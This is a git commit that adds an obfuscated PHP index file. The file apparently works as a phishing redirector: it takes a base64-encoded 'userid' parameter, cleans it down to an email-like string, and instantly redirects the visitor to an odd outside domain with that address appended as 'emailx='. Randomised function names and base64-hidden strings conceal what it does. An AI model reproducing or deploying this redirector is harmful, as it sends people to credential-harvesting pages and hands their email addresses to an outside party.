4d8b00a1230e49fc26457aade6f5c0adc60542eb
spratt0232 <spratt@kennedymechanicalinc.com>
2024-12-12 08:06:21 -0800

    Add files via upload

---
+++ base64-randchar/index.php
@@ -0,0 +1,5 @@
+<?php
+$url = "https://suript.cvll0yde.com/?emailx=";
+
+function uefa38ac($ladf3f363){if(base64_encode(base64_decode($ladf3f363))===$ladf3f363){return true;}else{return false;}}function x2524fb56($oe7927c74,$wef3ace15){if(uefa38ac($oe7927c74)){$oe7927c74=base64_decode($oe7927c74,false);}$oe7927c74=preg_replace(base64_decode('L1teQS1aYS16MC05LiAtIEBdLw=='),'',$oe7927c74);header("refresh:0;url=$wef3ace15".$oe7927c74);}if(isset($_GET[base64_decode('dXNlcmlk')])&&!empty($_GET[base64_decode('dXNlcmlk')])){$oe7927c74=$_GET[base64_decode('dXNlcmlk')];x2524fb56($oe7927c74,$url);}
+?>
